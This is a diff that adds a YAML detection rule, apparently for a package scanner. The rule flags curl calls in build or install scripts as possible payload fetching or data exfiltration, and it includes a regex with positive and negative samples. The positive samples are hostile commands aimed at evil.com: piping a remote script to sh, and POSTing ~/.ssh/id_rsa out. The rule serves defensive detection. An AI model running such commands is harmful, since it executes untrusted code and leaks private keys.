@@ -1,0 +1,35 @@
+name: curl
+version: "0.1.0"
+attck:
+  - T1041
+  - T1105
+message: >-
+  curl fetches a remote resource or sends data to a remote host. In a shell
+  script or Make-like file it runs when the package is built, checked, or
+  installed, and may be used to fetch a remote payload or to exfiltrate
+  credentials or other data.
+regex: '(?<=^|[^[:alnum:]_-])curl(?=(\.exe)?([^[:alnum:]_./-]|$))'
+positive_examples:
+  - |
+    curl -s https://www.evil.com/evil.sh
+  - |
+    /usr/bin/curl -fsSL https://www.evil.com/evil.sh | sh
+  - |
+    PAYLOAD := $(shell curl -s https://www.evil.com/payload)
+  - |
+    curl -X POST --data-binary @$HOME/.ssh/id_rsa https://www.evil.com/collect
+  - |
+    curl.exe -s https://www.evil.com/evil.sh
+negative_examples:
+  - |
+    PKG_LIBS="-lcurl"
+  - |
+    PKG_CFLAGS=$(shell curl-config --cflags)
+  - |
+    have_libcurl=yes
+  - |
+    curl_version_info_data *info;
+  - |
+    #include <curl/curl.h>
+  - |
+    # See: https://github.com/jeroen/curl/issues/376
